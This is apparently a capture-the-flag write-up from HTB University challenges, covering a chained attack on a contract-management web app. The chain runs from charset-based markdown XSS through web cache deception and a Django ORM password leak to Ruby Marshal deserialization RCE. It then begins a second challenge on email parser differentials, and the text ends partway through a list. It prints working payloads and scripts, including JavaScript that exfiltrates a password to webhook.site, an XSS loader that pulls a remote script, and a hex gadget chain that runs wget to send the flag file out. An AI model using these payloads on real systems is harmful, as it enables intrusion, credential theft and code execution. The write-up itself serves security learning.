def startChromiumBot(url):
    print(url, file=sys.stdout)
    chrome_options = Options()
    chrome_options.binary_location = &#34;/usr/bin/chromium-browser&#34; 
    chrome_options.add_argument(&#34;--headless&#34;) 
    chrome_options.add_argument(&#34;--no-sandbox&#34;)
    chrome_options.add_argument(&#34;--disable-dev-shm-usage&#34;)
    chrome_options.add_argument(&#34;--disable-gpu&#34;)
    chrome_options.add_argument(&#34;--disable-software-rasterizer&#34;)
    
    chrome_service = Service(&#34;/usr/bin/chromedriver&#34;)
    driver = webdriver.Chrome(service=chrome_service, options=chrome_options)

    try:
        driver.get(&#39;http://127.0.0.1:1337/login&#39;)
        
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.ID, &#34;loginBtn&#34;))
        )
        
        username = &#34;contract_manager&#34;
        password = get_contract_manager_password()
        
        input1 = driver.find_element(By.XPATH, &#39;/html/body/code/section/div/div/div/form/div[1]/input&#39;)
        input2 = driver.find_element(By.XPATH, &#39;/html/body/code/section/div/div/div/form/div[2]/input&#39;)
        # Can i abuse this to get password        
        input1.send_keys(username)
        input2.send_keys(password)

        submit_button = driver.find_element(By.ID, &#34;loginBtn&#34;)
        driver.execute_script(&#34;arguments[0].click();&#34;, submit_button)

        driver.get(url)
        time.sleep(30)
    finally:
        driver.quit()
</code></pre><p>-&gt;  This will create a contract_manager account and use it as a bot and then visit our website. We cannot really stole the cookie due to http only but if we can xss , we can call any command of a contract_manager which we wil talk later after finding xss.</p>


<h1 class="relative group">Finding XSS 
    <div id="finding-xss" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#finding-xss" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>So this is the first time I try xss in ruby so i search something and it seems something like  :</li>
</ul>
<pre tabindex="0"><code class="language-ruby=" data-lang="ruby=">    &lt;%= @a.html_safe %&gt;
</code></pre><ul>
<li>This will be vulnerable to xss if we control the @a so I try to find that gadget and there is something here:</li>
</ul>
<pre tabindex="0"><code class="language-ruby=" data-lang="ruby="># app/helpers/application_helper.rb
module ApplicationHelper
  def render_markdown(text)
    return &#39;&#39; if text.nil? # Return an empty string if text is nil

    # Configure Redcarpet to render Markdown with links and images enabled
    renderer = Redcarpet::Render::HTML.new(filter_html: true)
    markdown = Redcarpet::Markdown.new(renderer, {
      no_intra_emphasis: true,
      autolink: true,
      tables: true,
      fenced_code_blocks: true,
      disable_indented_code_blocks: true,
      strikethrough: true,
      superscript: true
    })

    # Render Markdown to HTML
    markdown.render(text).html_safe
  end
end
</code></pre><ul>
<li>Yeh , so we find a markdown xss vulnerabilities here. It is rendered in /settings template. Importantly, It will filter all HTML tag and just left the images and link.
So now add some javascript  link</li>
</ul>
<pre tabindex="0"><code class="language-mardown=" data-lang="mardown=">[abc](javascript:alert&#39;1&#39;)
</code></pre><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SkL5srES1g.png" alt="image" />
    
  </figure>
</p>
<ul>
<li>Well we have xss but it seems a self xss and we cannot call anything like onerror automatically.</li>
<li>But then you can find something interesting in the source code at</li>
</ul>
<pre tabindex="0"><code class="language-ruby=" data-lang="ruby="># lib/remove_charset_middleware.rb
class RemoveCharsetMiddleware
    def initialize(app)
      @app = app
    end
  
    def call(env)
      status, headers, response = @app.call(env)
      headers[&#34;Content-Type&#34;] = headers[&#34;Content-Type&#34;].sub(/; charset=.*$/, &#39;&#39;) if headers[&#34;Content-Type&#34;]
      [status, headers, response]
    end
  end
  
</code></pre><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rJdU2BESye.png" alt="image" />
    
  </figure>
</p>
<ul>
<li>You can see , there is no charset specified !!
Damnn, xss with missing charset comes into the play. Just try some \x1b$B and \x1b(B now bro.

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/H1mBAHNBke.png" alt="image" />
    
  </figure>

Here we get ISO-2022-JS ~~ !!.
So this time to configure a payload to call an onerror. After a long time, it will be :</li>
</ul>
<pre tabindex="0"><code>bio:
![\x1B$@](abc)+\x1B(B+![abc](onerror=alert//)
</code></pre><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/ByKoXINBJg.png" alt="image" />
    
  </figure>

&mdash;&raquo; Now we have XSS !!!!</p>


<h1 class="relative group">How to this XSS trigger the contract_manager 
    <div id="how-to-this-xss-trigger-the-contract_manager" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#how-to-this-xss-trigger-the-contract_manager" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>Another problem is how this xss can be visited by contract_manager ?</li>
<li>It is depended on our session and render each own settings right ?  So how can it is possible . Now we come to a new technique called <a href="https://www.youtube.com/watch?v=70yyOMFylUA" target="_blank">Web Cache Depception</a> , you can see this video for more understand.</li>
</ul>
<pre tabindex="0"><code class="language-nginx=" data-lang="nginx="> server {
        listen 1337;
        server_name _;
        # Proxy server forward to localhost:3000 and cache possible
        location ~ \.(css|js|jpg|jpeg|png|gif|ico|woff|woff2|ttf|svg|eot|html|json)$ {
            proxy_cache my_cache;
            proxy_cache_key &#34;$uri$is_args$args&#34;;
            proxy_cache_valid 200 5m;
            proxy_cache_valid 404 1m;

            proxy_pass http://127.0.0.1:3000;

            proxy_set_header Host $http_host; # Pass original host and port
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

            proxy_http_version 1.1;
            add_header X-Cache-Status $upstream_cache_status;
        }

        location / {
            proxy_pass http://127.0.0.1:3000;

            proxy_set_header Host $http_host; # Pass original host and port
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

            proxy_http_version 1.1;
            add_header X-Cache-Status $upstream_cache_status;
        }
    }
</code></pre><p>This is configure to cache our data through a proxy server before forwarding to server. Let me simply explain how web cache works.</p>
<ul>
<li>First it will check the filename fetched extension before caching it, if the cache isn&rsquo;t storing any thing , forward the requests to server and get the response then store response cache. Any time after this , ANOTHER calls to the same resources, it will check from cache first and receive data from cache. But we call poison the cache with OUR XSS PAYLOAD !!!.</li>
<li>We can find some bypass based on difference of parsing delemiter between nginx and and ruby. (delimiter in ruby is &ldquo;.&rdquo;)</li>
</ul>
<p>So if we call a request like  &ldquo;/settings.ico&rdquo; this will matches with &ldquo;/settings&rdquo; in ruby !! But it will be cached in proxy cache server !!
We can test it with simple call a GET requests to /settings.ico</p>
<p>Before caching :

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/Hkj4IIEHke.png" alt="image" />
    
  </figure>

Successfully caching :

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/Sk4IL8EB1g.png" alt="image" />
    
  </figure>
</p>
<ul>
<li>Now everyone gets into settings.ico will be poisonous with our xss !! And as well as the CONTRACT_MANAGER</li>
</ul>


<h1 class="relative group">Gain access as a contract_manager partly 
    <div id="gain-access-as-a-contract_manager-partly" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#gain-access-as-a-contract_manager-partly" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>We had XSS but we cannot stole the cookies like I said before. But we can also call every routes of a contract_manager !!  So let&rsquo;s login as a contract_manager with our Docker for a faster investigate.

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/r1kLPLEHkl.png" alt="image" />
    
  </figure>

AS a contact_manager, we have only new Features  is FILTERING</li>
</ul>
<pre tabindex="0"><code>http://localhost:1337/contracts/manage?title__contains=&amp;status=&amp;start_date=&amp;end_date=
</code></pre><p>So let&rsquo;s read the source to find some vulnerabilites</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">class FilteredContractsView(APIView):
    permission_classes = [IsAuthenticated, IsContractManagerOrAdmin]

    def post(self, request, format=None):
        try:
            if request.data.get(&#34;all&#34;) == True:
                contracts = Contract.objects.all()
            else:
                filtered_data = {key: value for key, value in request.data.items() if key != &#34;all&#34;}
                contracts = Contract.objects.filter(**filtered_data)
                
            serializer = ContractSerializer(contracts, many=True)
        except Exception as e:
            return Response({&#34;error&#34;: str(e)}, status=status.HTTP_400_BAD_REQUEST)
            
        return Response(serializer.data, status=status.HTTP_200_OK)
</code></pre><ul>
<li>This app handles SQL with a django ORM.</li>
<li>When apply a filter function the syntax for example :</li>
</ul>
<pre tabindex="0"><code class="language-python=" data-lang="python=">products = Product.objects.filter(name=&#39;Laptop&#39;)
</code></pre><p>But there is something leaked with</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">  filtered_data = {key: value for key, value in request.data.items() if key != &#34;all&#34;}
  contracts = Contract.objects.filter(**filtered_data)
</code></pre><p>We can handle our choice to select !!!  You can read more here to better understand <a href="https://www.elttam.com/blog/plormbing-your-django-orm/" target="_blank">https://www.elttam.com/blog/plormbing-your-django-orm/</a></p>
<ul>
<li>Now we need to find what we can leak here by reading it&rsquo;s relationship establishment.</li>
</ul>
<pre tabindex="0"><code class="language-python=" data-lang="python=">  owner = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        on_delete=models.CASCADE,
        related_name=&#39;contracts&#39;,
        help_text=&#34;User who owns the contract&#34;
    )
</code></pre><p>In the Contract model , it has a field owner who owns the contracts !! And we can leak the username password with owner__password__startswith= &ldquo;randomCharHere&rdquo; like boolean search.
Here is exploit :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">chars</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">adminPassword</span>  <span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">webhook</span> <span class="o">=</span> <span class="s2">&#34;https://webhook.site/307dd0c2-4733-4e45-954a-009ff8242f3a?a=&#34;</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">leak</span><span class="p">(</span><span class="nx">adminPassword</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">adminPassword</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="nx">webhook</span><span class="o">+</span><span class="nx">adminPassword</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="kr">char</span> <span class="k">of</span> <span class="nx">chars</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="nx">adminPassword</span><span class="o">+</span><span class="kr">char</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="p">=&gt;</span><span class="nx">data</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">data</span><span class="p">)=&gt;{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;No contracts found based on the current filter.&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">adminPassword</span><span class="o">+=</span><span class="kr">char</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">adminPassword</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">leak</span><span class="p">(</span><span class="nx">adminPassword</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">leak</span><span class="p">(</span><span class="nx">adminPassword</span><span class="p">)</span>
</span></span></code></pre></div><p>Now we test this script on Dev tools

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/H1Z8xPVSyx.png" alt="image" />
    
  </figure>

And receive admin password at webhook :

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rJ6IlD4ryl.png" alt="image" />
    
  </figure>
</p>
<ul>
<li>Now combine this with our xss before to create a malicous script src !!
Then report it and receive admin pasword !!

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SynhYwVHye.png" alt="image" />
    
  </figure>
</li>
</ul>
<pre tabindex="0"><code>bio : 
![\x1B$@](abc)+\x1B(B+![abc](onerror=s=document.createElement(&#39;script&#39;);s.src=&#39;http://garrulous-protest.surge.sh/payload.js&#39;;document.body.appendChild(s);//)
</code></pre><ul>
<li>We successfully leak the admin password so let&rsquo;s login in</li>
</ul>


<h1 class="relative group">ADMIN PRIVILEGE 
    <div id="admin-privilege" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#admin-privilege" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SJc35PNHJl.png" alt="image" />
    
  </figure>

As admin we have the new feature is CONTRACT TEMPLATES.</p>
<pre tabindex="0"><code class="language-ruby=" data-lang="ruby="># Contract template controllers
 def create
    user_data = current_user
    
    unless user_data &amp;&amp; user_data[&#39;id&#39;]
      flash[:alert] = &#34;User must be logged in to create a template.&#34;
      redirect_to login_path and return
    end
    serialized_content = Marshal.dump(params[:content])
  
    response = HTTP.auth(&#34;Token #{session[:token]}&#34;).post(&#34;http://localhost:8080/api/contract_templates/&#34;, json: { data: serialized_content, user_id: user_data[&#39;id&#39;] }.merge(params.to_unsafe_h))
  
    if response.status.success?
      flash[:notice] = &#34;Template created successfully.&#34;
      redirect_to contract_templates_path
    else
      flash.now[:alert] = &#34;Failed to create template.&#34;
      render :new
    end
  end
  

  def show
    response = HTTP.auth(&#34;Token #{session[:token]}&#34;).get(&#34;http://localhost:8080/api/contract_templates/#{params[:id]}/&#34;)

    if response.status.success?
      @template = response.parse
      
      content = Marshal.load(@template[&#39;data&#39;]) if @template[&#39;data&#39;]

      @template[&#39;id&#39;] ||= params[:id]
      @template[&#39;name&#39;] ||= &#39;Unnamed Template&#39;
      @template[&#39;description&#39;] ||= &#39;No description provided.&#39;
      @template[&#39;data&#39;] = content
      @template[&#39;created_at&#39;] ||= Time.current.to_s
    else
      redirect_to contract_templates_path, alert: &#34;Template not found.&#34;
    end
  endk
</code></pre><ul>
<li>When creating a content , it will serialize our data but it seems can be changed with our params cause using <strong>merge</strong>  function??</li>
<li>Is the ruby is vulnerable to Insecure Serialization ?</li>
<li>Well doing some reasearch, and the answer is yesss !!! So here is the key to execute code to read file flag.</li>
</ul>


<h1 class="relative group">The hard things 
    <div id="the-hard-things" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#the-hard-things" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>Well so the main idea of Insecure Deserialization is find some gadget to call require to some sink function. This is really hard to find it in a CTF challenge, but it is lucky that there are many researcher find this for us. We can use this right now and I will spend sometime to research it latter . :v</li>
<li>And here is the POC for that  . <a href="https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb" target="_blank">https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb</a></li>
<li>Apply this we get the payload  :</li>
</ul>
<pre tabindex="0"><code class="language-python=" data-lang="python=">#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

username = &#34;admin&#34;
password = ADMIN_PASSWORD

base_url = &#34;http://127.0.0.1:1337&#34;

session = requests.Session()

def getAuthenToken(html):
    soup = BeautifulSoup(html, &#34;html.parser&#34;)
    return soup.find(&#34;input&#34;, {&#34;name&#34;: &#34;authenticity_token&#34;})[&#34;value&#34;]

    login_page = session.get(f&#34;{base_url}/login&#34;)
    login_page.raise_for_status()

    authenticity_token = getAuthenToken(login_page.text)

    login_payload = {
        &#34;username&#34;: username,
        &#34;password&#34;: password,
        &#34;authenticity_token&#34;: authenticity_token
    }

    ## LOGIN AS ADMIN
    response = session.post(f&#34;{base_url}/login&#34;, data=login_payload)
    response.raise_for_status()
## GET RCE 
    content_data = &#34;04085b07631547656d3a3a5370656346657463686572553a1147656d3a3a56657273696f6e5b066f3a1e47656d3a3a526571756573745365743a3a4c6f636b66696c650a3a09407365746f3a1447656d3a3a52657175657374536574063a1540736f727465645f72657175657374735b076f3a2547656d3a3a5265736f6c7665723a3a5370656353706563696669636174696f6e063a0a40737065636f3a2447656d3a3a5265736f6c7665723a3a47697453706563696669636174696f6e073a0c40736f75726
    3656f3a1547656d3a3a536f757263653a3a4769740a3a09406769744922087a6970063a0645543a0f407265666572656e63654922102f6574632f706173737764063b10543a0e40726f6f745f6469724922092f746d70063b10543a10407265706f7369746f7279492208616e79063b10543a0a406e616d65492208616e79063b10543b0b6f3a2147656d3a3a5265736f6c7665723a3a53706563696669636174696f6e073b14492208616e79063b10543a1240646570656e64656e636965735b006f3b0a063b0b6f3b0c073b0d6f3b0e0a3b0f4922087a6970063b10543b114922652d546d54543d222428776765742068747470733a2f2f776562686f6f6b2e736974652f33303764643063322d343733332d346534352d393534612d3030396666383234326633613f613d60636174202f666c61672e747874602922612e7a6970063b10543b124922092f746d70063b10543b13492208616e79063b10543b14492208616e79063b10543b0b6f3b15073b14492208616e79063b10543b165b003b165b003a134067656d5f646570735f66696c6549220a2f726f6f74063b10543a124067656d5f646570735f6469724922062f063b10543a0f40706c6174666f726d735b00&#34;
    byte_data = bytes.fromhex(content_data)
    contracts_page = session.get(f&#34;{base_url}/contract_templates/new&#34;)
    contracts_page.raise_for_status()

    authenticity_token = getAuthenToken(contracts_page.text)

    contracts_payload = {
        &#34;authenticity_token&#34;: authenticity_token,
        &#34;name&#34;: &#34;test&#34;,
        &#34;description&#34;: &#34;test&#34;,
        &#34;content&#34;: &#34;test&#34;,
        &#34;commit&#34;: &#34;Create Template&#34;,
        &#34;data&#34;:byte_data
    }

    response = session.post(f&#34;{base_url}/contract_templates&#34;, data=contracts_payload)
</code></pre><p>And the flag !!

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BJTkDrrrkg.png" alt="image" />
    
  </figure>
</p>


<h1 class="relative group">Conclusion 
    <div id="conclusion-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#conclusion-1" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>This is a big chain of vulnerabilities and modern attacks skills. I cannot solve this by myself but the write ups helps me alot.</li>
<li>I still need to read about the research of ORM leaks, Marshal latter when I have free time :Vvv</li>
</ul>


<h1 class="relative group">Web - Intergalactic Bounty 
    <div id="web---intergalactic-bounty" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#web---intergalactic-bounty" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>Hard challenge from HTB University
Knowledge: Email disparency, Prototype pollution, Needle</p>


<h1 class="relative group">Overview 
    <div id="overview-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#overview-1" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/ByIVNHtBJl.png" alt="image" />
    
  </figure>
</p>
<ul>
<li>Firstly, we have an login page where we must register with an account and our given email is <a href="mailto:test@email.htb">test@email.htb</a></li>
<li>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SJLLNHKr1x.png" alt="image" />
    
  </figure>

Here is the logic for register. It seems just accept the domain interstellar.htb.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">registerAPI</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">email</span><span class="p">,</span> <span class="nx">password</span><span class="p">,</span> <span class="nx">role</span> <span class="o">=</span> <span class="s2">&#34;guest&#34;</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">emailDomain</span> <span class="o">=</span> <span class="nx">emailAddresses</span><span class="p">.</span><span class="nx">parseOneAddress</span><span class="p">(</span><span class="nx">email</span><span class="p">)</span><span class="o">?</span><span class="p">.</span><span class="nx">domain</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">emailDomain</span> <span class="o">||</span> <span class="nx">emailDomain</span> <span class="o">!==</span> <span class="s1">&#39;interstellar.htb&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;Registration is not allowed for this email domain&#39;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">createUser</span><span class="p">(</span><span class="nx">email</span><span class="p">,</span> <span class="nx">password</span><span class="p">,</span> <span class="nx">role</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;User registered. Verification email sent.&#34;</span><span class="p">,</span> <span class="nx">status</span><span class="o">:</span> <span class="mi">201</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">message</span><span class="o">:</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">,</span> <span class="nx">status</span><span class="o">:</span> <span class="mi">500</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><ul>
<li>Specially it uses email-address library to parse the email .</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">emailAddresses</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;email-addresses&#39;</span><span class="p">);</span>
</span></span></code></pre></div><ul>
<li>We can read this from the manual page of email-address</li>
<li>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/ryNlBSYB1e.png" alt="image" />
    
  </figure>
</li>
<li>It supports the RFC 5322 and gives us an interesting email format:
&ldquo;BOB example&rdquo;&lt;bop@example.com&gt; ? This looks really weird at first sight. With the text in &quot;&quot; is a name of domain.
Read more , we will see that the server again use other library to send email which is NodeMailer</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">transporter</span> <span class="o">=</span> <span class="nx">nodemailer</span><span class="p">.</span><span class="nx">createTransport</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">port</span><span class="o">:</span> <span class="mi">1025</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">secure</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sendVerificationEmail</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">email</span><span class="p">,</span> <span class="nx">code</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">mailOptions</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">from</span><span class="o">:</span> <span class="s2">&#34;no-reply@interstellar.htb&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">to</span><span class="o">:</span> <span class="nx">email</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">subject</span><span class="o">:</span> <span class="s2">&#34;Email Verification&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">html</span><span class="o">:</span> <span class="sb">`Your verification code is: </span><span class="si">${</span><span class="nx">code</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">transporter</span><span class="p">.</span><span class="nx">sendMail</span><span class="p">(</span><span class="nx">mailOptions</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Verification email sent to </span><span class="si">${</span><span class="nx">email</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Error sending email:&#34;</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;Unable to send verification email&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><ul>
<li>Then i try this payload and it works.((I will explain later))</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">email</span> <span class="o">:</span><span class="s1">&#39; &#34;test@email.htb&#34; @interstellar.htb&#39;</span>
</span></span></code></pre></div><p>But this wont work ( JUST A SPACE )</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">email</span> <span class="o">:</span><span class="s1">&#39; &#34;test@email.htb&#34;@interstellar.htb&#39;</span>
</span></span></code></pre></div><p>This abuse the differences in ways of 2 library parses out our address !!! This will trickyly send to our email kkk !!!</p>
<ul>
<li>Moreover, in logic requests it seems something vulnerable when setting the default value without actually block it ! We can get admin privilege from this !</li>
